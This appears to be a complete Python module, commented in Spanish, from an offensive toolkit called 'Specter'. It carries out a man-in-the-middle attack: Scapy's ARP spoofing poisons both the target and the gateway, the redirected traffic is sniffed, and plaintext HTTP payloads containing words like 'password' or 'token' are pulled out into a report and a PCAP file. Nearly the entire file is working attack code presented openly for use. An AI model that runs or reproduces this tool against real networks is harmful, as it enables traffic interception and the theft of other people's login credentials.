"""
Specter — Modulo: Man-in-the-Middle (ARP Spoofing)
Tecnicas: ARP poisoning, sniffing de trafico, captura de credenciales HTTP.
Requiere: Scapy (con privilegios root), ip_forward habilitado.
"""

import threading
import time
from typing import Optional
from pathlib import Path

from scapy.all import (
    ARP, Ether, srp, send, sniff, IP, TCP, Raw, wrpcap
)

from utils.helpers import (
    banner, success, info, warning, error,
    run_command, timestamp, human_timestamp,
    ensure_dir, is_valid_ip
)
from utils.logger import get_logger
from config import DEFAULT_INTERFACE, REPORTS_DIR

log = get_logger("mitm")

CAPTURE_DIR = Path("/tmp/specter_mitm")
_stop_event = threading.Event()


# ─── IP Forwarding ────────────────────────────────────────────────────────────

def enable_ip_forward() -> None:
    """Habilita IP forwarding en el kernel (Linux)."""
    run_command(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
    success("IP forwarding habilitado.")


def disable_ip_forward() -> None:
    """Deshabilita IP forwarding."""
    run_command(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])
    info("IP forwarding deshabilitado.")


# ─── Resolucion de MAC ────────────────────────────────────────────────────────

def get_mac(ip: str, iface: str) -> Optional[str]:
    """Obtiene la direccion MAC de una IP via ARP request."""
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_req
    answered, _ = srp(packet, timeout=3, iface=iface, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    return None


# ─── ARP Spoofing ─────────────────────────────────────────────────────────────

def arp_spoof(target_ip: str, spoof_ip: str, target_mac: str) -> None:
    """
    Envia un paquete ARP falso al target diciendole que somos el spoof_ip.
    Debe ejecutarse en un loop continuo.
    """
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def restore_arp(target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str) -> None:
    """Restaura las tablas ARP a su estado original."""
    packet = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=gateway_mac,
    )
    send(packet, count=5, verbose=False)
    success("Tablas ARP restauradas.")


def spoof_loop(target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str) -> None:
    """Loop de ARP poisoning. Corre en un thread separado."""
    info(f"ARP spoofing activo: {target_ip} ↔ {gateway_ip}")
    while not _stop_event.is_set():
        arp_spoof(target_ip, gateway_ip, target_mac)   # Envenenar al target
        arp_spoof(gateway_ip, target_ip, gateway_mac)  # Envenenar al gateway
        time.sleep(2)


# ─── Sniffing de trafico ──────────────────────────────────────────────────────

captured_packets = []
captured_creds   = []


def packet_callback(pkt) -> None:
    """Callback para cada paquete capturado."""
    captured_packets.append(pkt)
    _extract_creds(pkt)


def _extract_creds(pkt) -> None:
    """Busca credenciales en texto plano en trafico HTTP."""
    if pkt.haslayer(Raw) and pkt.haslayer(TCP):
        payload = pkt[Raw].load.decode(errors="ignore")
        keywords = ["username", "password", "user", "pass", "login", "email", "pwd", "token"]
        if any(kw in payload.lower() for kw in keywords):
            src = pkt[IP].src if pkt.haslayer(IP) else "?"
            dst = pkt[IP].dst if pkt.haslayer(IP) else "?"
            entry = {
                "src":     src,
                "dst":     dst,
                "port":    pkt[TCP].dport,
                "payload": payload[:500],
            }
            captured_creds.append(entry)
            warning(f"[CRED] {src} → {dst}:{pkt[TCP].dport}")
            info(payload[:200])


def start_sniff(iface: str, duration: int) -> None:
    """Inicia sniffing en la interfaz durante N segundos."""
    info(f"Sniffing en {iface} por {duration} segundos...")
    sniff(iface=iface, prn=packet_callback, store=False, timeout=duration)


# ─── Reporte ──────────────────────────────────────────────────────────────────

def save_report(target: str, gateway: str, output: Optional[str]) -> Path:
    ensure_dir(REPORTS_DIR)
    filename = output or str(REPORTS_DIR / f"mitm_{target.replace('.', '_')}_{timestamp()}.md")
    path = Path(filename)

    lines = [
        f"# Reporte MITM — {target}",
        f"**Fecha:** {human_timestamp()}",
        f"**Gateway:** {gateway}",
        f"**Paquetes capturados:** {len(captured_packets)}",
        "",
        "## Credenciales detectadas (HTTP en texto plano)",
    ]
    if captured_creds:
        for c in captured_creds:
            lines += [
                f"### {c['src']} → {c['dst']}:{c['port']}",
                "```",
                c["payload"],
                "```",
                "",
            ]
    else:
        lines.append("_No se detectaron credenciales en texto plano._")

    path.write_text("\n".join(lines), encoding="utf-8")
    return path


def save_pcap(output_dir: Optional[str] = None) -> Optional[Path]:
    """Guarda la captura de paquetes en formato PCAP."""
    if not captured_packets:
        return None
    ensure_dir(CAPTURE_DIR)
    pcap_path = CAPTURE_DIR / f"capture_{timestamp()}.pcap"
    wrpcap(str(pcap_path), captured_packets)
    success(f"PCAP guardado: {pcap_path}")
    return pcap_path


# ─── Punto de entrada ─────────────────────────────────────────────────────────

def run(
    target: Optional[str],
    gateway: Optional[str],
    iface: Optional[str] = None,
    duration: int = 60,
    verbose: bool = False,
) -> None:
    if not target or not gateway:
        error("Debes especificar --target y --gateway")
        return
    if not is_valid_ip(target) or not is_valid_ip(gateway):
        error("IP invalida en --target o --gateway")
        return

    iface = iface or DEFAULT_INTERFACE
    banner("MITM — ARP Spoofing + Sniffing", f"Target: {target} | Gateway: {gateway} | Iface: {iface}")

    # Obtener MACs
    info(f"Resolviendo MAC de {target}...")
    target_mac = get_mac(target, iface)
    if not target_mac:
        error(f"No se pudo obtener la MAC de {target}")
        return

    info(f"Resolviendo MAC de {gateway}...")
    gateway_mac = get_mac(gateway, iface)
    if not gateway_mac:
        error(f"No se pudo obtener la MAC de {gateway}")
        return

    success(f"MAC del target:   {target_mac}")
    success(f"MAC del gateway:  {gateway_mac}")

    # Habilitar forwarding
    enable_ip_forward()

    # Iniciar ARP spoofing en thread separado
    _stop_event.clear()
    spoof_thread = threading.Thread(
        target=spoof_loop,
        args=(target, gateway, target_mac, gateway_mac),
        daemon=True,
    )
    spoof_thread.start()

    try:
        # Sniffing en el thread principal
        start_sniff(iface, duration)
    except KeyboardInterrupt:
        warning("Interrupcion manual recibida.")
    finally:
        # Detener spoofing y restaurar ARP
        _stop_event.set()
        spoof_thread.join(timeout=5)
        restore_arp(target, gateway, target_mac, gateway_mac)
        disable_ip_forward()

        # Guardar capturas
        save_pcap()
        report_path = save_report(target, gateway, None)
        success(f"Reporte guardado en: {report_path}")
